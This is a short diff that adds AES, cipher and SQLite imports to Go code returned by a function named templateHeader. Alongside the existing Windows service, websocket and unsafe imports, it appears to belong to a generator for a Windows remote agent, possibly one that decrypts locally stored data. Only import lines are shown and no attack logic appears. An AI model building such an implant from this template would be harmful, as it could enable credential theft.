@@ -7,6 +7,9 @@ func templateHeader() string {
 
 import (
 	"bytes"
+	"crypto/aes"
+	"crypto/cipher"
+	"database/sql"
 	"encoding/base64"
 	"encoding/json"
 	"crypto/tls"
@@ -33,6 +36,7 @@ import (
 	"unsafe"
 
 	"github.com/gorilla/websocket"
+	_ "github.com/mattn/go-sqlite3"
 	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/svc"
 	"golang.org/x/image/draw"
